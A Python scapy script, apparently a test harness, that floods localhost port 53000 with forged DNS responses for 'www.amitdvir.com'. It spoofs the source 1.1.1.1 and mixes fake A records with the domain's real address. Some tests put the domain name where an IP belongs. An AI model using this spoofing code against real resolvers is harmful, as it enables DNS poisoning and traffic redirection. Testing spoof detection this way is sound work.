from scapy.all import *
import time
from datetime import datetime
dst = "localhost"
src = "1.1.1.1"

amitdvir_real_ip = "160.153.129.23"
amitdvir_domain = "www.amitdvir.com"

SPAM_SECONDS = 1

VERBOSE = False

#status=1
#1.1.1.1, 2.2.2.2
def amit_test1():
    pkt1 = IP(src=src, dst=dst)/UDP(sport=53, dport=53000)/DNS(id=0,
        aa=1,
        rd=1,
        qd=DNSQR(qname=amitdvir_domain),
        qr=1,
        qdcount=1,
        ancount=2)
    pkt1[DNS].an = DNSRR(rrname=amitdvir_domain,rdata="1.1.1.1")/DNSRR(rrname=amitdvir_domain, rdata="2.2.2.2")
    now = time.time()
    while time.time() < now + SPAM_SECONDS:
        send(pkt1, verbose=VERBOSE)

#status=0
#1.1.1.1, real
def amit_test2():
    pkt1 = IP(src=src, dst=dst)/UDP(sport=53, dport=53000)/DNS(id=0,
        aa=1,
        rd=1,
        qd=DNSQR(qname=amitdvir_domain),
        qr=1,
        qdcount=1,
        ancount=2)
    pkt1[DNS].an = DNSRR(rrname=amitdvir_domain,rdata="1.1.1.1")/DNSRR(rrname=amitdvir_domain, rdata=amitdvir_domain)
    now = time.time()
    while time.time() < now + SPAM_SECONDS:
        send(pkt1, verbose=VERBOSE)
    

#status=0
#real, real
def amit_test3():
    pkt1 = IP(src=src, dst=dst)/UDP(sport=53, dport=53000)/DNS(id=0,
        aa=1,
        rd=1,
        qd=DNSQR(qname=amitdvir_domain),
        qr=1,
        qdcount=1,
        ancount=1)
    pkt1[DNS].an = DNSRR(rrname=amitdvir_domain, rdata=amitdvir_domain)
    now = time.time()
    while time.time() < now + SPAM_SECONDS:
        send(pkt1, verbose=VERBOSE)


#same as amit_test2()
#but the DNSRR is switched 
def amit_test4():
    pkt1 = IP(src=src, dst=dst)/UDP(sport=53, dport=53000)/DNS(id=0,
        aa=1,
        rd=1,
        qd=DNSQR(qname=amitdvir_domain),
        qr=1,
        qdcount=1,
        ancount=2)
    pkt1[DNS].an = DNSRR(rrname=amitdvir_domain, rdata="2.2.2.2")/DNSRR(rrname=amitdvir_domain,rdata=amitdvir_real_ip)

    
    pkt2 = IP(src=src, dst=dst)/UDP(sport=53, dport=53000)/DNS(id=0,
        aa=1,
        rd=1,
        qd=DNSQR(qname=amitdvir_domain),
        qr=1,
        qdcount=1,
        ancount=2)
    pkt2[DNS].an = DNSRR(rrname=amitdvir_domain,rdata=amitdvir_real_ip)/DNSRR(rrname=amitdvir_domain, rdata="2.2.2.2")

    now = time.time()
    while time.time() < now + SPAM_SECONDS:
        send(pkt1, verbose=VERBOSE)
        send(pkt2, verbose=VERBOSE)


#2.2.2.2 , 3.3.3.3
#2.2.2.2, real
#2.2.2.2
def amit_test5():
    pkt1 = IP(src=src, dst=dst)/UDP(sport=53, dport=53000)/DNS(id=0,
        aa=1,
        rd=1,
        qd=DNSQR(qname=amitdvir_domain),
        qr=1,
        qdcount=1,
        ancount=2)
    pkt1[DNS].an = DNSRR(rrname=amitdvir_domain, rdata="2.2.2.2")/DNSRR(rrname=amitdvir_domain,rdata="3.3.3.3")

    
    pkt2 = IP(src=src, dst=dst)/UDP(sport=53, dport=53000)/DNS(id=0,
        aa=1,
        rd=1,
        qd=DNSQR(qname=amitdvir_domain),
        qr=1,
        qdcount=1,
        ancount=2)
    pkt2[DNS].an = DNSRR(rrname=amitdvir_domain,rdata=amitdvir_real_ip)/DNSRR(rrname=amitdvir_domain, rdata="2.2.2.2")

    now = time.time()
    while time.time() < now + SPAM_SECONDS:
        send(pkt1, verbose=VERBOSE)
        send(pkt2, verbose=VERBOSE)
